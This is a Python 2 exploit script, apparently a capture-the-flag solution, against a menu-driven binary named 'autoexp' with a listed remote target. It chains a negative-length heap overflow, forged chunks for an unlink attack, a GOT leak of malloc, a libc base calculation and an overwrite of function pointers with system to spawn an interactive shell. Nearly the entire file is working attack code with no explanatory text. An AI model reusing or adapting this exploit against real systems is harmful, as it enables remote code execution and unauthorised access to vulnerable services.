from threading import Thread
# from uploadflag import *
from zio import *

target = ('119.254.101.197', 10000)
target = './autoexp'


def interact(io):
    def run_recv():
        while True:
            try:
                output = io.read_until_timeout(timeout=1)
                # print output
            except:
                return

    t1 = Thread(target=run_recv)
    t1.start()
    while True:
        d = raw_input()
        if d != '':
            io.writeline(d)

def add_function(io, name, para, data):
    io.read_until('Option:')
    io.writeline('1')
    io.read_until(':')
    io.writeline(name)
    io.read_until(':')
    io.writeline(para+'\n')
    io.read_until(':')
    io.writeline(data+'\n')

def show_function(io, index):
    io.read_until('Option:')
    io.writeline('4')
    io.read_until('back:')
    io.writeline(str(index))

def delete_function(io, index):
    io.read_until('Option:')
    io.writeline('2')
    io.read_until('back:')
    io.writeline(str(index))

def build(io):
    io.read_until('Option:')
    io.writeline('5')

def add_start_part(io, name, start_part):
    io.read_until('Option:')
    io.writeline('6')
    io.read_until('Option')
    io.writeline('1')
    io.read_until(':')
    io.writeline(name)
    io.read_until(':')
    io.writeline(start_part)


def add_end_part(io, end_part):
    io.read_until('Option:')
    io.writeline('6')
    io.read_until('Option')
    io.writeline('2')
    io.read_until(':')
    io.writeline(end_part)

def add_read_write(io, readall, writeall):
    io.read_until('Option:')
    io.writeline('6')
    io.read_until('Option')
    io.writeline('3')
    io.read_until('read')
    io.writeline(readall)
    io.read_until('write')
    io.writeline(writeall)

def enter_edit(io, index):
    io.read_until('Option:')
    io.writeline('3')
    io.read_until('back:')
    io.writeline(str(index))

def exit_edit(io):
    io.read_until('Option:')
    io.writeline('0')

def edit_comments(io, length, comment):
    io.read_until('Option:')
    io.writeline('9')
    io.writeline(str(length))
    io.writeline(comment)

def exp(target):
    io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), \
             print_write=COLORED(RAW, 'green'))
    add_function(io, 'fun1', 'para1', 'data1')
    add_function(io, 'fun2', 'para2', 'data2')
    enter_edit(io, 2)
    edit_comments(io, 100, 'comment')
    add_read_write(io, 'a'*80, 'b'*80)

    heap_ptr = 0x6036f0
    payload = 'a'*0x60 + l64(0) + l64(0) + l64(0) + l64(0x51) + l64(heap_ptr-0x18) + l64(heap_ptr-0x10)
    payload += 'a'*0x30 + l64(0x50) + l64(0xa0)

    enter_edit(io, 1)
    edit_comments(io, 200, 'a'*0x30 + l64(0)+l64(0x31)+'a'*0x20+l64(0)+l64(0x21))

    enter_edit(io, 2)
    edit_comments(io, -1, payload)

    add_read_write(io, '', 'b'*99)

    #g_readall :0x0000000000604460
    #g_writeall: 0x0000000000604400
    #g_ptr: 0x0000000000604050
    #comment: 0x0000000000604390
    #0x00000000006044c0

    interact(io)

def exp2(target):
    io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), \
             print_write=COLORED(RAW, 'green'))
    add_function(io, 'fun1', 'para1', 'data1')
    enter_edit(io, 1)
    edit_comments(io, 0xe0, 'comment')
    add_function(io, 'fun2', 'para2', 'data2')
    enter_edit(io, 1)
    edit_comments(io, -1, 'a'*0xf0)
    io.read_until('Option:')
    io.writeline('4')
    io.read_until('back:')
    io.read_until('2: ')
    heap_addr = l64(io.readline()[:-1].ljust(8, '\x00'))
    io.writeline(str(2))
    print hex(heap_addr) #0x604320

    offset = heap_addr  - 0x604320
    enter_edit(io, 1)

    malloc_got = 0x0000000000603210
    payload = 'a'*0xf0 + l64(0x604370+offset) + l64(0x604340+offset) + l64(0x604320+offset) + l64(malloc_got) + l64(0) + l64(0x21) + l64(0x604400+offset)
    payload += l64(0) + l64(0) + l64(0x21) + l64(0x0000000000603200)
    payload += l64(0) + l64(0) + l64(0x21)
    payload += l64(0x00000000326e7566) + l64(0) + l64(0) + l64(0x81) + l64(0)
    edit_comments(io, -1, payload)

    io.read_until('Option:')
    io.writeline('4')
    io.read_until('back:')
    io.read_until('2: ')

    io.writeline('2')
    io.read_until('#')


    malloc= l64(io.readline()[:-1].ljust(8, '\x00'))
    print hex(malloc)

    base = malloc - 0x0000000000083580
    system = base + 0x0000000000045390

    base = malloc - 0x000000000007ABA0
    system = base + 0x000000000003E8B0

    print hex(base)
    print hex(system)
    enter_edit(io, 2)

    #system = 0x7ffff7a53390

    io.read_until('Option:')
    io.writeline('5')
    io.read_until(':')
    io.writeline('1')
    io.read_until('content')

    payload = l64(0x0000000000400856)+l64(0x0000000000400866)
    payload += l64(0x400876)
    payload += l64(0x400886)
    payload += l64(0x400896)
    payload += l64(system)[:-1]
    io.writeline(payload)

    io.read_until(':')
    io.writeline('sh')

    interact(io)

exp2(target)
